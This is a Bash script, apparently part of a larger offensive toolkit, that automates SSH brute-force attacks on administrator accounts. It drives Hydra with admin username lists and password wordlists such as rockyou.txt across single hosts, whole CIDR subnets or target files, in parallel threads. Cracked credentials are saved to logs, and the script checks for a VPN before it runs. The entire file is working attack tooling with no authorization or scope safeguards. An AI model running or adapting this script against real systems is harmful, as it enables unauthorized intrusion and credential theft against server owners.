#!/bin/bash

# SSH Admin Attack Script
# Automated SSH brute-force targeting admin accounts

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger and utilities
source "$SCRIPT_DIR/logger.sh"
source "$SCRIPT_DIR/vpn_check.sh"
source "$SCRIPT_DIR/target_manager.sh"

# Default configuration
THREADS=16
TIMEOUT=30
TARGET=""
PORT=22
RESUME_FILE="$PROJECT_ROOT/logs/ssh_resume.txt"
SKIP_VPN_CHECK=false

# Ensure logs directory exists
mkdir -p "$PROJECT_ROOT/logs"

# Common admin usernames
DEFAULT_USERNAMES=(root admin administrator sysadmin user)

# Trap for cleanup
trap 'rm -f "$output_file" 2>/dev/null' EXIT ERR

# Function to display help
show_help() {
    print_banner "SSH Admin Attack Script"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target IP, CIDR (e.g., 192.168.1.0/24), or target list file"
    echo ""
    echo "Optional:"
    echo "  -p, --port        SSH port (default: 22)"
    echo "  -u, --user-list   Custom username list file"
    echo "  -w, --word-list   Custom password wordlist file"
    echo "  -T, --threads     Number of parallel threads (default: 16)"
    echo "  -o, --timeout     Connection timeout in seconds (default: 30)"
    echo "  -r, --resume      Resume from previous attack"
    echo "  -v, --verbose     Verbose output"
    echo "  --skip-vpn        Skip VPN connectivity check (NOT recommended)"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -t 192.168.1.0/24           # Scan entire subnet"
    echo "  $0 -t targets.txt               # Scan from file"
    echo "  $0 -t 192.168.1.100 -p 2222 -w /path/to/passwords.txt"
    echo "  $0 -t example.com -u users.txt -T 32"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    # Check if hydra is installed
    if ! command -v hydra &> /dev/null; then
        log_error "Hydra is not installed. Please run install.sh first"
        exit 1
    fi
}

# Function to get wordlists
get_wordlists() {
    local wordlists=()
    
    # Check for custom wordlist
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlists+=("$CUSTOM_WORDLIST")
    fi
    
    # Check for default wordlists
    if [ -f "$PROJECT_ROOT/config/admin_passwords.txt" ]; then
        wordlists+=("$PROJECT_ROOT/config/admin_passwords.txt")
    fi
    
    if [ -f "$HOME/wordlists/common_passwords.txt" ]; then
        wordlists+=("$HOME/wordlists/common_passwords.txt")
    fi
    
    if [ -f "$HOME/wordlists/rockyou.txt" ]; then
        wordlists+=("$HOME/wordlists/rockyou.txt")
    fi
    
    echo "${wordlists[@]}"
}

# Function to get usernames
get_usernames() {
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        echo "$CUSTOM_USERLIST"
    elif [ -f "$PROJECT_ROOT/config/admin_usernames.txt" ]; then
        echo "$PROJECT_ROOT/config/admin_usernames.txt"
    else
        # Create temp file with default usernames
        local temp_users=$(mktemp)
        printf "%s\n" "${DEFAULT_USERNAMES[@]}" > "$temp_users"
        echo "$temp_users"
    fi
}

# Function to run SSH attack
run_attack() {
    local username_file=$(get_usernames)
    local wordlists=($(get_wordlists))
    
    if [ ${#wordlists[@]} -eq 0 ]; then
        log_error "No password wordlists found"
        exit 1
    fi
    
    print_header "Starting SSH Attack"
    log_info "Target: $TARGET:$PORT"
    log_info "Username list: $username_file"
    log_info "Threads: $THREADS"
    log_info "Timeout: ${TIMEOUT}s"
    echo ""
    
    local total_wordlists=${#wordlists[@]}
    local current_wordlist=0
    
    for wordlist in "${wordlists[@]}"; do
        current_wordlist=$((current_wordlist + 1))
        local wordlist_name=$(basename "$wordlist")
        
        print_header "Wordlist $current_wordlist/$total_wordlists: $wordlist_name"
        
        if [ ! -f "$wordlist" ]; then
            log_warning "Wordlist not found: $wordlist"
            continue
        fi
        
        local word_count=$(wc -l < "$wordlist")
        log_info "Testing $word_count passwords..."
        
        # Run hydra
        local output_file=$(mktemp)
        hydra -L "$username_file" -P "$wordlist" \
              -t $THREADS \
              -w $TIMEOUT \
              -o "$output_file" \
              -f \
              ssh://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
            
            if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
                # Parse successful login (support credentials with spaces)
                local login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
                local password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
                
                save_result "ssh" "$TARGET" "$login" "$password" "$PORT"
                log_success "Valid credentials found: $login:$password"
                
                # Save to resume file
                echo "SUCCESS: $login:$password" >> "$RESUME_FILE"
                
                return 0
            fi
            
            [ "$VERBOSE" = "true" ] && echo "$line"
        done
        
        if [ $? -eq 0 ]; then
            log_success "Attack successful! Check logs for credentials."
            return 0
        fi
    done
    
    log_warning "No valid credentials found"
    return 1
}

# Parse command line arguments
CUSTOM_WORDLIST=""
CUSTOM_USERLIST=""
VERBOSE=false
RESUME=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREADS="$2"
            shift 2
            ;;
        -o|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -r|--resume)
            RESUME=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        --skip-vpn)
            SKIP_VPN_CHECK=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner "SSH Admin Attack"
echo ""

# VPN Check (unless skipped)
if [ "$SKIP_VPN_CHECK" = "false" ]; then
    require_vpn "false"
    echo ""
fi

validate_input

# Check if multi-target input
if [ -f "$TARGET" ] || is_cidr "$TARGET"; then
    show_target_summary "$TARGET"
    
    log_info "Processing multiple targets..."
    target_count=$(count_targets "$TARGET")
    log_info "Total targets to attack: $target_count"
    echo ""
    
    current=0
    success_count=0
    fail_count=0
    
    process_targets "$TARGET" | while read -r single_target; do
        current=$((current + 1))
        echo ""
        log_info "[$current/$target_count] Attacking target: $single_target"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        # Temporarily set TARGET to single target
        original_target="$TARGET"
        TARGET="$single_target"
        
        if run_attack; then
            success_count=$((success_count + 1))
        else
            fail_count=$((fail_count + 1))
        fi
        
        TARGET="$original_target"
    done
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    log_info "Multi-target attack complete!"
    log_info "Successful: $success_count | Failed: $fail_count | Total: $target_count"
    
else
    # Single target attack
    # Check resume
    if [ "$RESUME" = "true" ] && [ -f "$RESUME_FILE" ]; then
        log_info "Resuming from previous attack..."
        cat "$RESUME_FILE"
    fi
    
    # Run the attack
    run_attack
fi
exit_code=$?

# Cleanup
rotate_logs

exit $exit_code
